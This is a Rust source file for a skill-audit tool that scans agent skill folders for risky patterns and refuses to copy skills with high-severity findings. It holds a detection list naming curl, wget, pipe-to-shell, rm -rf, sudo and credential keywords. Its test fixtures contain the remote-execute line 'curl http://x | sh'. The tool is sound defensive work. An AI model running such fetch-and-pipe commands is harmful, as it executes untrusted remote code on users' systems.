//! Inspect a skill and flag risky patterns before you trust or copy it.
//! Adapted from galaxy-gateway/steal-skill, refactored so findings are returned
//! (not just printed) so `steal` can gate on them.

use anyhow::{anyhow, Result};
use colored::Colorize;
use metarepo_core::SkillSettings;
use regex::Regex;
use std::path::Path;
use walkdir::WalkDir;

use super::skill_file::Skill;

/// Filenames written by steal itself — never audited (they quote finding text
/// and would otherwise self-flag).
pub const REVIEW_FILE: &str = ".meta-review.md";
const SOURCE_FILE: &str = ".meta-source.toml";
/// Tag embedded in inline review markers so a re-audit ignores them.
pub const MARKER_TAG: &str = "meta:review";

#[derive(Debug)]
pub struct Finding {
    pub severity: Severity,
    /// Path relative to the skill root (e.g. `SKILL.md`, `scripts/run.sh`).
    pub file: String,
    pub message: String,
    /// 1-based line the pattern matched on, when known.
    pub line: Option<usize>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Severity {
    High,
    Medium,
    Low,
}

impl Severity {
    fn paint(&self, s: &str) -> colored::ColoredString {
        match self {
            Severity::High => s.red().bold(),
            Severity::Medium => s.yellow().bold(),
            Severity::Low => s.blue(),
        }
    }
    pub fn label(&self) -> &'static str {
        match self {
            Severity::High => "HIGH",
            Severity::Medium => "MED ",
            Severity::Low => "LOW ",
        }
    }

    /// Parse a config severity string (`high`/`medium`/`low`, case-insensitive).
    fn from_label(s: &str) -> Result<Self> {
        match s.trim().to_ascii_lowercase().as_str() {
            "high" => Ok(Severity::High),
            "medium" | "med" => Ok(Severity::Medium),
            "low" => Ok(Severity::Low),
            other => Err(anyhow!(
                "invalid audit severity '{}' (expected high, medium, or low)",
                other
            )),
        }
    }
}

/// Collect findings for the skill at `path` using only the built-in patterns.
/// Convenience wrapper over [`audit_skill_with`] for callers without config.
pub fn audit_skill(path: &Path) -> Result<(Skill, Vec<Finding>)> {
    audit_skill_with(path, &AuditRules::default())
}

/// Collect findings for the skill at `path` (a dir or a `SKILL.md`) using the
/// given rule set (built-ins plus any configured extras/suppressions).
pub fn audit_skill_with(path: &Path, rules: &AuditRules) -> Result<(Skill, Vec<Finding>)> {
    let skill = Skill::load(path)?;
    let mut findings = Vec::new();
    audit_frontmatter(&skill, &mut findings);
    audit_tree(&skill.root, rules, &mut findings);
    Ok((skill, findings))
}

/// True if any finding is HIGH severity — the gate `steal` uses to refuse a copy.
pub fn has_high(findings: &[Finding]) -> bool {
    findings.iter().any(|f| f.severity == Severity::High)
}

/// Print findings in the same format the `audit` subcommand uses.
pub fn print_findings(findings: &[Finding]) {
    if findings.is_empty() {
        println!("\n{}", "no risky patterns detected".green());
        return;
    }
    println!("\n{}", format!("{} finding(s):", findings.len()).bold());
    for f in findings {
        let loc = match f.line {
            Some(l) => format!("{}:{}", f.file, l),
            None => f.file.clone(),
        };
        println!(
            "  [{}] {} — {}",
            f.severity.paint(f.severity.label()),
            loc.dimmed(),
            f.message
        );
    }
}

/// The `meta skill audit <path>` entrypoint.
pub fn run(path: &str, settings: Option<&SkillSettings>) -> Result<()> {
    let rules = AuditRules::from_settings(settings)?;
    let (skill, findings) = audit_skill_with(Path::new(path), &rules)?;
    println!("{} {}", "Auditing:".bold(), skill.display_name());
    println!("  root: {}", skill.root.display());
    print_findings(&findings);
    Ok(())
}

fn audit_frontmatter(skill: &Skill, findings: &mut Vec<Finding>) {
    if skill.frontmatter.name.is_none() {
        findings.push(Finding {
            severity: Severity::Low,
            file: "SKILL.md".into(),
            message: "missing `name` in frontmatter".into(),
            line: None,
        });
    }
    if skill.frontmatter.description.is_none() {
        findings.push(Finding {
            severity: Severity::Low,
            file: "SKILL.md".into(),
            message: "missing `description` in frontmatter".into(),
            line: None,
        });
    }
    if let Some(tools) = &skill.frontmatter.allowed_tools {
        let s = format!("{:?}", tools).to_lowercase();
        if s.contains("bash(*)") || s == "string(\"*\")" || s.contains("\"*\"") {
            // Locate the `allowed-tools` line in the SKILL.md frontmatter.
            let line = std::fs::read_to_string(&skill.skill_md).ok().and_then(|c| {
                c.lines()
                    .position(|l| l.to_lowercase().contains("allowed-tools"))
                    .map(|i| i + 1)
            });
            findings.push(Finding {
                severity: Severity::High,
                file: "SKILL.md".into(),
                message: "allowed-tools grants unrestricted access (wildcard)".into(),
                line,
            });
        }
    }
}

/// Content patterns flagged by the audit, paired with severity and a message.
const PATTERNS: &[(Severity, &str, &str)] = &[
    (Severity::High, "curl ", "curl invocation (network fetch)"),
    (Severity::High, "wget ", "wget invocation (network fetch)"),
    (
        Severity::High,
        "| sh",
        "piping into shell (remote-exec pattern)",
    ),
    (
        Severity::High,
        "| bash",
        "piping into bash (remote-exec pattern)",
    ),
    (Severity::High, "rm -rf", "destructive rm -rf"),
    (Severity::High, "sudo ", "sudo invocation"),
    (Severity::High, "eval ", "eval (dynamic code execution)"),
    (
        Severity::Medium,
        "chmod +x",
        "chmod +x (makes file executable)",
    ),
    (Severity::Medium, "git push", "git push"),
    (Severity::Medium, "--no-verify", "bypasses git hooks"),
    (
        Severity::Medium,
        "aws_secret",
        "possible credential reference",
    ),
    (Severity::Medium, "api_key", "possible credential reference"),
    (Severity::Medium, "ssh ", "ssh invocation"),
];

/// The set of patterns an audit runs: the built-in substring needles (minus any
/// suppressed by config) plus user-declared regex patterns. Built with
/// [`AuditRules::from_settings`]; [`AuditRules::default`] is the built-ins only.
#[derive(Debug, Clone)]
pub struct AuditRules {
    /// Built-in `(severity, needle, message)` entries, case-insensitive substring.
    builtins: Vec<(Severity, &'static str, &'static str)>,
    /// User-declared `(severity, compiled regex, message)` entries.
    extras: Vec<(Severity, Regex, String)>,
}

impl Default for AuditRules {
    fn default() -> Self {
        Self {
            builtins: PATTERNS.to_vec(),
            extras: Vec::new(),
        }
    }
}

impl AuditRules {
    /// Build the rule set from `[skill]` config: drop any built-in whose needle
    /// is listed in `audit-suppress`, and compile each `audit-patterns` regex
    /// case-insensitively. Errors on an invalid regex or severity so a
    /// misconfigured audit fails loudly rather than silently under-checking.
    pub fn from_settings(settings: Option<&SkillSettings>) -> Result<Self> {
        let mut rules = Self::default();
        let Some(settings) = settings else {
            return Ok(rules);
        };

        if let Some(suppress) = &settings.audit_suppress {
            rules
                .builtins
                .retain(|(_, needle, _)| !suppress.iter().any(|s| s == needle));
        }

        if let Some(patterns) = &settings.audit_patterns {
            for p in patterns {
                let severity = Severity::from_label(&p.severity)?;
                // Compile case-insensitive to match the built-in substring pass.
                let re = Regex::new(&format!("(?i){}", p.pattern))
                    .map_err(|e| anyhow!("invalid audit-patterns regex '{}': {}", p.pattern, e))?;
                rules.extras.push((severity, re, p.message.clone()));
            }
        }
        Ok(rules)
    }

    /// Push a finding for every rule that matches `line` in `file` at `line_no`.
    fn scan_line(&self, file: &str, line_no: usize, line: &str, findings: &mut Vec<Finding>) {
        let lower = line.to_lowercase();
        for (sev, needle, msg) in &self.builtins {
            if lower.contains(needle) {
                findings.push(Finding {
                    severity: *sev,
                    file: file.to_string(),
                    message: (*msg).to_string(),
                    line: Some(line_no),
                });
            }
        }
        for (sev, re, msg) in &self.extras {
            if re.is_match(line) {
                findings.push(Finding {
                    severity: *sev,
                    file: file.to_string(),
                    message: msg.clone(),
                    line: Some(line_no),
                });
            }
        }
    }
}

fn audit_tree(root: &Path, rules: &AuditRules, findings: &mut Vec<Finding>) {
    for entry in WalkDir::new(root).into_iter().filter_map(|e| e.ok()) {
        let p = entry.path();
        if !p.is_file() {
            continue;
        }
        let rel = p.strip_prefix(root).unwrap_or(p).display().to_string();

        // Never audit steal's own bookkeeping files (they quote finding text).
        if matches!(
            p.file_name().and_then(|n| n.to_str()),
            Some(REVIEW_FILE) | Some(SOURCE_FILE)
        ) {
            continue;
        }

        // Executable scripts shipped with a skill are worth a heads-up.
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            if let Ok(meta) = p.metadata() {
                if meta.permissions().mode() & 0o111 != 0 {
                    findings.push(Finding {
                        severity: Severity::Medium,
                        file: rel.clone(),
                        message: "executable file shipped with skill".into(),
                        line: None,
                    });
                }
            }
        }

        let Ok(content) = std::fs::read_to_string(p) else {
            continue;
        };

        // Scan per line so each finding carries a line number. Skip our own
        // inline review markers so they don't re-flag.
        for (idx, raw) in content.lines().enumerate() {
            if raw.contains(MARKER_TAG) {
                continue;
            }
            rules.scan_line(&rel, idx + 1, raw, findings);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use metarepo_core::AuditPattern;
    use std::fs;
    use tempfile::tempdir;

    #[test]
    fn flags_curl_as_high() {
        let tmp = tempdir().unwrap();
        let dir = tmp.path().join("risky");
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join("SKILL.md"),
            "---\nname: risky\ndescription: d\n---\nrun: curl http://x | sh\n",
        )
        .unwrap();
        let (_, findings) = audit_skill(&dir).unwrap();
        assert!(has_high(&findings));
    }

    #[test]
    fn clean_skill_has_no_high() {
        let tmp = tempdir().unwrap();
        let dir = tmp.path().join("clean");
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join("SKILL.md"),
            "---\nname: clean\ndescription: d\n---\njust prose\n",
        )
        .unwrap();
        let (_, findings) = audit_skill(&dir).unwrap();
        assert!(!has_high(&findings));
    }

    /// Write a one-file skill at `<tmp>/<name>` whose body is `body`.
    fn write_skill(tmp: &Path, name: &str, body: &str) -> std::path::PathBuf {
        let dir = tmp.join(name);
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join("SKILL.md"),
            format!("---\nname: {name}\ndescription: d\n---\n{body}\n"),
        )
        .unwrap();
        dir
    }

    fn settings(
        patterns: Option<Vec<AuditPattern>>,
        suppress: Option<Vec<String>>,
    ) -> SkillSettings {
        SkillSettings {
            audit_patterns: patterns,
            audit_suppress: suppress,
            ..Default::default()
        }
    }

    #[test]
    fn configured_pattern_adds_a_finding() {
        let tmp = tempdir().unwrap();
        let dir = write_skill(tmp.path(), "custom", "please POST to our INTERNAL endpoint");
        // Built-ins alone see nothing here.
        assert!(audit_skill(&dir).unwrap().1.is_empty());

        let s = settings(
            Some(vec![AuditPattern {
                severity: "high".into(),
                pattern: r"internal\s+endpoint".into(),
                message: "references an internal endpoint".into(),
            }]),
            None,
        );
        let rules = AuditRules::from_settings(Some(&s)).unwrap();
        let (_, findings) = audit_skill_with(&dir, &rules).unwrap();
        // Matched case-insensitively, like the built-in pass.
        assert!(has_high(&findings));
        assert_eq!(findings[0].message, "references an internal endpoint");
    }

    #[test]
    fn suppressing_a_builtin_drops_its_finding() {
        let tmp = tempdir().unwrap();
        let dir = write_skill(tmp.path(), "curly", "run: curl http://x | sh");
        assert!(has_high(&audit_skill(&dir).unwrap().1));

        let s = settings(None, Some(vec!["curl ".into()]));
        let rules = AuditRules::from_settings(Some(&s)).unwrap();
        let (_, findings) = audit_skill_with(&dir, &rules).unwrap();
        assert!(!findings.iter().any(|f| f.message.contains("curl")));
    }

    #[test]
    fn invalid_regex_is_rejected() {
        let s = settings(
            Some(vec![AuditPattern {
                severity: "high".into(),
                pattern: "unclosed(".into(),
                message: "m".into(),
            }]),
            None,
        );
        let err = AuditRules::from_settings(Some(&s)).unwrap_err().to_string();
        assert!(err.contains("invalid audit-patterns regex"), "got: {err}");
    }

    #[test]
    fn invalid_severity_is_rejected() {
        let s = settings(
            Some(vec![AuditPattern {
                severity: "critical".into(),
                pattern: "x".into(),
                message: "m".into(),
            }]),
            None,
        );
        let err = AuditRules::from_settings(Some(&s)).unwrap_err().to_string();
        assert!(err.contains("invalid audit severity"), "got: {err}");
    }

    #[test]
    fn no_settings_means_builtins_only() {
        let rules = AuditRules::from_settings(None).unwrap();
        assert_eq!(rules.builtins.len(), PATTERNS.len());
        assert!(rules.extras.is_empty());
    }
}
